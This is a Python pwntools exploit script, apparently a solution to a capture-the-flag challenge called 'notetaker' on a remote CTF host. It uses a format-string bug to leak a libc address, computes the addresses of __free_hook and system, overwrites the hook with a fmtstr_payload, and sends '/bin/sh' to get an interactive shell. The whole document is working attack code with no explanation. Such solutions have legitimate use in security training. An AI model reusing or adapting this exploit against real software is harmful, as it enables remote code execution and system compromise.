from pwn import *
context.arch = 'amd64' # important for format string payload
context.log_level= 'DEBUG'

p = remote('notetaker.ctf.pascalctf.it','9002')
#p = process('./notetaker')
#gdb.attach(p)


p.recvuntil(">")
p.sendline("2")
p.recvuntil("Enter the note:")
p.sendline("%p")

p.recvuntil(">")
p.sendline("1")
leak=int(p.recvline(),16)

libc_base= leak - 0x3c4b28
free_hook= libc_base + 0x3c67a8
system_address= libc_base + 0x453a0
#debug type shii
print(hex(leak))
print(hex(libc_base))
print(hex(free_hook))
print(hex(system_address))

payload = fmtstr_payload(8, {free_hook:system_address},
                          numbwritten=0, write_size='byte')

p.recvuntil(">")
p.sendline("3")

p.recvuntil(">")
p.sendline("2")
p.recvuntil("Enter the note:")
p.sendline(payload)

p.recvuntil(">")
p.sendline("1")

p.recvuntil(">")

p.sendline(b"\x2f\x62\x69\x6e\x2f\x73\x68\x00")
p.interactive()